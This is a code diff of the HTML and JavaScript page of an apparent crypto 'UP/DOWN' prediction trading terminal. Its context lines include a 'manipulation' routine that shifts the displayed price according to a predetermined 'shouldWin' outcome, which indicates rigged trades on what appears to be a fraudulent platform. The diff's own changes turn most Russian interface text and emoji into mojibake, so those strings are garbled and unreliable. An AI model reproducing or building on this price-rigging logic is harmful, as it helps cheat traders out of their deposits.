@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -12,7 +12,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'">
   <script src="js/i18n.js" defer></script>
   <script src="js/keyboard-nav.js" defer></script>
-  <script src="js/auth.js?v=2" defer></script>
+  <script src="js/auth.js?v=3" defer></script>
   <script src="js/prefetch.js" defer></script>
   <style>body { opacity: 1; }</style>
   <script>(function() { var lang = localStorage.getItem('nexo_lang') || 'ru'; document.documentElement.lang = lang; document.addEventListener('gesturestart', function(e) { e.preventDefault(); }); document.addEventListener('gesturechange', function(e) { e.preventDefault(); }); document.addEventListener('gestureend', function(e) { e.preventDefault(); }); document.addEventListener('touchstart', function(e) { if(e.touches.length > 1) e.preventDefault(); }, { passive: false }); })();</script>
@@ -709,20 +709,20 @@
       <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
     </svg>
   </div>
-  <h2 style="color:#f0f6fc; font-size:24px; font-weight:700; margin:0 0 12px 0;">Доступ ограничен</h2>
-  <p style="color:#8b949e; max-width:320px; line-height:1.7; font-size:15px; margin:0 0 32px 0;">Ваш аккаунт временно заблокирован. Для выяснения причин и восстановления доступа свяжитесь с поддержкой.</p>
+  <h2 style="color:#f0f6fc; font-size:24px; font-weight:700; margin:0 0 12px 0;">Р”РѕСЃС‚СѓРї РѕРіСЂР°РЅРёС‡РµРЅ</h2>
+  <p style="color:#8b949e; max-width:320px; line-height:1.7; font-size:15px; margin:0 0 32px 0;">Р’Р°С€ Р°РєРєР°СѓРЅС‚ РІСЂРµРјРµРЅРЅРѕ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ. Р”Р»СЏ РІС‹СЏСЃРЅРµРЅРёСЏ РїСЂРёС‡РёРЅ Рё РІРѕСЃСЃС‚Р°РЅРѕРІР»РµРЅРёСЏ РґРѕСЃС‚СѓРїР° СЃРІСЏР¶РёС‚РµСЃСЊ СЃ РїРѕРґРґРµСЂР¶РєРѕР№.</p>
   <a href="support.html" style="display:inline-flex; align-items:center; gap:8px; padding:14px 28px; background:linear-gradient(135deg, #00d4aa 0%, #00b894 100%); color:#000; text-decoration:none; border-radius:12px; font-weight:600; font-size:15px; box-shadow:0 4px 20px rgba(0,212,170,0.3); transition:transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 24px rgba(0,212,170,0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 20px rgba(0,212,170,0.3)'">
     <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
-    Связаться с поддержкой
+    РЎРІСЏР·Р°С‚СЊСЃСЏ СЃ РїРѕРґРґРµСЂР¶РєРѕР№
   </a>
-  <p style="color:#6e7681; font-size:12px; margin-top:24px;">Код ошибки: ACCESS_DENIED</p>
+  <p style="color:#6e7681; font-size:12px; margin-top:24px;">РљРѕРґ РѕС€РёР±РєРё: ACCESS_DENIED</p>
 </div>
 
 <div class="app-container">
   <!-- Header -->
   <div class="terminal-header">
     <a href="trading.html" class="back-btn">
-      <span>←</span>
+      <span>в†ђ</span>
       <span data-i18n="back">Back</span>
     </a>
   </div>
@@ -773,11 +773,11 @@
   <!-- Trade Actions -->
   <div class="trade-actions">
     <button class="btn-trade btn-up" onclick="openTrade('buy')">
-      <span>↑</span>
+      <span>в†‘</span>
       <span data-i18n="up">UP</span>
     </button>
     <button class="btn-trade btn-down" onclick="openTrade('sell')">
-      <span>↓</span>
+      <span>в†“</span>
       <span data-i18n="down">DOWN</span>
     </button>
   </div>
@@ -821,7 +821,7 @@
   </div>
   
   <div class="panel-title" id="panelTitle">
-    <span class="arrow-up">↑</span>
+    <span class="arrow-up">в†‘</span>
     <span data-i18n="predictUp">Predict: UP</span>
   </div>
   
@@ -1032,7 +1032,7 @@
     manipulation.lastOffset = 0;
     manipulation.noiseSeed = Math.random() * 1000;
     
-    console.log('📈 Manipulation started:', {
+    console.log('рџ“€ Manipulation started:', {
       entryPrice: manipulation.entryPrice,
       direction: manipulation.direction,
       shouldWin: manipulation.shouldWin,
@@ -1049,7 +1049,7 @@
     manipulation.recovering = true;
     manipulation.recoverStart = Date.now();
     
-    console.log('📉 Manipulation stopped, recovery started, offset:', manipulation.savedOffset);
+    console.log('рџ“‰ Manipulation stopped, recovery started, offset:', manipulation.savedOffset);
   }
 
   // ===== CHECK FOR ACTIVE TRADE ON LOAD =====
@@ -1076,7 +1076,7 @@
           manipulation.lastOffset = 0;
           manipulation.noiseSeed = Math.random() * 1000;
           
-          console.log('📈 Resumed manipulation for active trade');
+          console.log('рџ“€ Resumed manipulation for active trade');
         }
       }
     } catch (e) {
@@ -1440,7 +1440,7 @@
       const trades = Array.isArray(payload?.data) ? payload.data : [];
 
       if (!trades.length) {
-        const noTradesText = lang === 'ru' ? 'Нет сделок' : 'No trades yet';
+        const noTradesText = lang === 'ru' ? 'РќРµС‚ СЃРґРµР»РѕРє' : 'No trades yet';
         container.innerHTML = `<div class="empty-trades">${noTradesText}</div>`;
         return;
       }
@@ -1451,10 +1451,10 @@
         
         const sign = isWin ? '+' : '-';
         const statusClass = isActive ? 'active' : (isWin ? 'win' : 'loss');
-        const statusText = isActive ? (lang === 'ru' ? 'активно' : 'active') : 
-                          (isWin ? (lang === 'ru' ? 'прибыль' : 'profit') : (lang === 'ru' ? 'убыток' : 'loss'));
+        const statusText = isActive ? (lang === 'ru' ? 'Р°РєС‚РёРІРЅРѕ' : 'active') : 
+                          (isWin ? (lang === 'ru' ? 'РїСЂРёР±С‹Р»СЊ' : 'profit') : (lang === 'ru' ? 'СѓР±С‹С‚РѕРє' : 'loss'));
         
-        const arrow = trade.direction === 'up' ? '↑' : '↓';
+        const arrow = trade.direction === 'up' ? 'в†‘' : 'в†“';
         const arrowColor = trade.direction === 'up' ? 'var(--success)' : 'var(--danger)';
         
         const created = trade.createdAt ? new Date(trade.createdAt) : new Date();
@@ -1504,7 +1504,7 @@
       startActiveTradeTimers();
       
     } catch {
-      const errorText = lang === 'ru' ? 'Ошибка загрузки' : 'Loading error';
+      const errorText = lang === 'ru' ? 'РћС€РёР±РєР° Р·Р°РіСЂСѓР·РєРё' : 'Loading error';
       container.innerHTML = `<div class="empty-trades">${errorText}</div>`;
     }
   }
@@ -1556,7 +1556,7 @@
     if (tradeEl?.dataset.closing === 'true') return;
     if (tradeEl) tradeEl.dataset.closing = 'true';
     
-    console.log(`🔄 Closing trade ${tradeId}, amount=${amount}, retry=${retryCount}`);
+    console.log(`рџ”„ Closing trade ${tradeId}, amount=${amount}, retry=${retryCount}`);
     
     try {
       const response = await fetch(`/api/trades/close/${tradeId}`, {
@@ -1566,21 +1566,21 @@
       });
 
       const payload = await response.json();
-      console.log(`📊 Close trade response:`, payload);
+      console.log(`рџ“Љ Close trade response:`, payload);
       
       const result = payload.data?.result;
       const profit = payload.data?.profit || 0;
       const serverAmount = payload.data?.amount || amount;
       const newBalance = payload.data?.newBalance;
       
-      console.log(`📊 Trade result: result=${result}, profit=${profit}, serverAmount=${serverAmount}, newBalance=${newBalance}`);
+      console.log(`рџ“Љ Trade result: result=${result}, profit=${profit}, serverAmount=${serverAmount}, newBalance=${newBalance}`);
 
       if (result === 'win') {
         // Show only the actual profit earned, not stake + profit
-        const msg = lang === 'ru' ? `✅ Прибыль! +${profit.toFixed(2)} USDT` : `✅ Profit! +${profit.toFixed(2)} USDT`;
+        const msg = lang === 'ru' ? `вњ… РџСЂРёР±С‹Р»СЊ! +${profit.toFixed(2)} USDT` : `вњ… Profit! +${profit.toFixed(2)} USDT`;
         showTradeNotification(msg, 'win');
       } else if (result === 'loss') {
-        const msg = lang === 'ru' ? `❌ Убыток. -${serverAmount.toFixed(2)} USDT` : `❌ Loss. -${serverAmount.toFixed(2)} USDT`;
+        const msg = lang === 'ru' ? `вќЊ РЈР±С‹С‚РѕРє. -${serverAmount.toFixed(2)} USDT` : `вќЊ Loss. -${serverAmount.toFixed(2)} USDT`;
         showTradeNotification(msg, 'loss');
       }
       
@@ -1612,7 +1612,7 @@
       info: '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>'
     };
     
-    const cleanMessage = message.replace(/^[✅❌🚀⛔️🎉⚠️\s]+/, '');
+    const cleanMessage = message.replace(/^[вњ…вќЊрџљЂв›”пёЏрџЋ‰вљ пёЏ\s]+/, '');
     
     notif.innerHTML = `
       <div class="notification-icon">${icons[type] || icons.info}</div>
@@ -1670,7 +1670,7 @@
     }
     const balance = parseFloat(balanceNum) || 0;
     
-    const minAmountText = lang === 'ru' ? 'Минимальная сумма: 1 USDT' : 'Minimum amount: 1 USDT';
+    const minAmountText = lang === 'ru' ? 'РњРёРЅРёРјР°Р»СЊРЅР°СЏ СЃСѓРјРјР°: 1 USDT' : 'Minimum amount: 1 USDT';
     if (isNaN(amount) || amount < 1) { 
       showTradeNotification(minAmountText, 'loss'); 
       return; 
@@ -1679,7 +1679,7 @@
     // Max amount limit
     const MAX_TRADE_AMOUNT = 100000;
     if (amount > MAX_TRADE_AMOUNT) {
-      const maxAmountText = lang === 'ru' ? `Максимальная сумма: ${MAX_TRADE_AMOUNT} USDT` : `Maximum amount: ${MAX_TRADE_AMOUNT} USDT`;
+      const maxAmountText = lang === 'ru' ? `РњР°РєСЃРёРјР°Р»СЊРЅР°СЏ СЃСѓРјРјР°: ${MAX_TRADE_AMOUNT} USDT` : `Maximum amount: ${MAX_TRADE_AMOUNT} USDT`;
       showTradeNotification(maxAmountText, 'loss');
       return;
     }
@@ -1693,7 +1693,7 @@
 
     const btn = document.getElementById('panelSubmitBtn');
     btn.disabled = true;
-    btn.innerText = lang === 'ru' ? 'Открытие...' : 'Opening...';
+    btn.innerText = lang === 'ru' ? 'РћС‚РєСЂС‹С‚РёРµ...' : 'Opening...';
 
     const activeTimeBtn = document.querySelector('#timeSelection .time-btn.active');
     const timeText = activeTimeBtn ? activeTimeBtn.textContent : '30s';
@@ -1716,23 +1716,23 @@
       const payload = await response.json();
       if (!response.ok) {
         if (payload?.tradingBlocked) {
-          const blockedText = lang === 'ru' ? '⛔ Торговля ограничена' : '⛔ Trading blocked';
+          const blockedText = lang === 'ru' ? 'в›” РўРѕСЂРіРѕРІР»СЏ РѕРіСЂР°РЅРёС‡РµРЅР°' : 'в›” Trading blocked';
           showTradeNotification(blockedText, 'loss');
         } else if (payload?.hasActiveTrade) {
-          const activeText = lang === 'ru' ? '⏳ У вас уже есть активная сделка' : '⏳ You already have an active trade';
+          const activeText = lang === 'ru' ? 'вЏі РЈ РІР°СЃ СѓР¶Рµ РµСЃС‚СЊ Р°РєС‚РёРІРЅР°СЏ СЃРґРµР»РєР°' : 'вЏі You already have an active trade';
           showTradeNotification(activeText, 'loss');
         } else if (payload?.rateLimited) {
           showTradeNotification(payload.error, 'loss');
         } else {
-          const errorText = payload?.error || (lang === 'ru' ? 'Не удалось открыть сделку' : 'Failed to open trade');
+          const errorText = payload?.error || (lang === 'ru' ? 'РќРµ СѓРґР°Р»РѕСЃСЊ РѕС‚РєСЂС‹С‚СЊ СЃРґРµР»РєСѓ' : 'Failed to open trade');
           showTradeNotification(errorText, 'loss');
         }
         btn.disabled = false;
-        btn.innerText = lang === 'ru' ? 'Открыть сделку' : 'Open Trade';
+        btn.innerText = lang === 'ru' ? 'РћС‚РєСЂС‹С‚СЊ СЃРґРµР»РєСѓ' : 'Open Trade';
         return;
       }
 
-      const successText = lang === 'ru' ? `🚀 Сделка открыта на ${timeText}!` : `🚀 Trade opened for ${timeText}!`;
+      const successText = lang === 'ru' ? `рџљЂ РЎРґРµР»РєР° РѕС‚РєСЂС‹С‚Р° РЅР° ${timeText}!` : `рџљЂ Trade opened for ${timeText}!`;
       showTradeNotification(successText, 'info');
       
       document.getElementById('tradeAmount').value = '';
@@ -1752,10 +1752,10 @@
       await Promise.all([loadUserBalance(), loadActiveTrades()]);
 
     } catch (err) {
-      showTradeNotification(lang === 'ru' ? 'Ошибка сети' : 'Network error', 'loss');
+      showTradeNotification(lang === 'ru' ? 'РћС€РёР±РєР° СЃРµС‚Рё' : 'Network error', 'loss');
     } finally {
       btn.disabled = false;
-      const openText = lang === 'ru' ? 'Открыть сделку' : 'Open Trade';
+      const openText = lang === 'ru' ? 'РћС‚РєСЂС‹С‚СЊ СЃРґРµР»РєСѓ' : 'Open Trade';
       btn.innerText = openText;
     }
   }
@@ -1775,10 +1775,10 @@
     const btn = document.getElementById('panelSubmitBtn');
     
     if (type === 'buy') {
-      titleEl.innerHTML = `<span class="arrow-up">↑</span> <span>${lang === 'ru' ? 'Прогноз: ВВЕРХ' : 'Predict: UP'}</span>`;
+      titleEl.innerHTML = `<span class="arrow-up">в†‘</span> <span>${lang === 'ru' ? 'РџСЂРѕРіРЅРѕР·: Р’Р’Р•Р РҐ' : 'Predict: UP'}</span>`;
       btn.className = 'panel-submit up';
     } else {
-      titleEl.innerHTML = `<span class="arrow-down">↓</span> <span>${lang === 'ru' ? 'Прогноз: ВНИЗ' : 'Predict: DOWN'}</span>`;
+      titleEl.innerHTML = `<span class="arrow-down">в†“</span> <span>${lang === 'ru' ? 'РџСЂРѕРіРЅРѕР·: Р’РќРР—' : 'Predict: DOWN'}</span>`;
       btn.className = 'panel-submit down';
     }
   }
@@ -1864,23 +1864,23 @@
 <nav class="bottom-nav">
     <a href="index.html" class="nav-item">
         <span class="nav-icon"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></span>
-        <span class="nav-label" data-i18n="home">Главная</span>
+        <span class="nav-label" data-i18n="home">Р“Р»Р°РІРЅР°СЏ</span>
     </a>
     <a href="trading.html" class="nav-item">
         <span class="nav-icon"><svg viewBox="0 0 24 24"><path d="M3.5 18.49l6-6.01 4 4L22 6.92l-1.41-1.41-7.09 7.97-4-4L2 16.99z"/></svg></span>
-        <span class="nav-label" data-i18n="markets">Рынки</span>
+        <span class="nav-label" data-i18n="markets">Р С‹РЅРєРё</span>
     </a>
     <a href="exchange.html" class="nav-item">
         <span class="nav-icon"><svg viewBox="0 0 24 24"><path d="M6.99 11L3 15l3.99 4v-3H14v-2H6.99v-3zM21 9l-3.99-4v3H10v2h7.01v3L21 9z"/></svg></span>
-        <span class="nav-label" data-i18n="exchange">Обмен</span>
+        <span class="nav-label" data-i18n="exchange">РћР±РјРµРЅ</span>
     </a>
     <a href="wallet.html" class="nav-item">
         <span class="nav-icon"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg></span>
-        <span class="nav-label" data-i18n="wallet">Кошелек</span>
+        <span class="nav-label" data-i18n="wallet">РљРѕС€РµР»РµРє</span>
     </a>
     <a href="profile.html" class="nav-item">
         <span class="nav-icon"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></span>
-        <span class="nav-label" data-i18n="profile">Профиль</span>
+        <span class="nav-label" data-i18n="profile">РџСЂРѕС„РёР»СЊ</span>
     </a>
 </nav>
 </body>
